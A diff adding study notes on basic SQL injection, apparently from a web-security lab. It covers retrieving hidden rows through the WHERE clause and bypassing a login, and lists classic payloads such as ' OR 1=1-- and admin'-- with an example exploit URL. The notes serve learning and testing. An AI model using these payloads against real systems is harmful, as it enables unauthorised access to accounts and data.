@@ -1,0 +1,60 @@
+# Basic SQL Injection
+
+---
+
+## 1. SQLi in WHERE Clause (Hidden Data Retrieval)
+
+### What is it?
+The application uses a SQL query to filter products by category.
+The attacker manipulates the WHERE clause to retrieve hidden data.
+
+### Vulnerable Query
+```sql
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+```
+
+### Attack
+```sql
+' OR 1=1--
+```
+
+### Result
+The condition becomes always true, returning all products including hidden ones.
+
+### Final URL
+/filter?category=Gifts'+OR+1=1--
+---
+
+## 2. Login Bypass
+
+### What is it?
+The application uses SQL to check login credentials.
+The attacker manipulates the query to bypass authentication completely.
+
+### Vulnerable Query
+```sql
+SELECT * FROM users WHERE username = 'admin' AND password = 'password'
+```
+
+### Attack
+```sql
+admin'--
+```
+
+### Result
+The password check is commented out, logging in as admin with no password needed.
+
+### What I Learned
+- `--` comments out the rest of the SQL query
+- Single quote `'` breaks out of the string context
+- Always test login forms for SQLi first
+
+---
+
+## Key Payloads
+
+| Payload | Purpose |
+|---------|---------|
+| `' OR 1=1--` | Return all data |
+| `admin'--` | Bypass login |
+| `' OR '1'='1` | Alternative bypass |
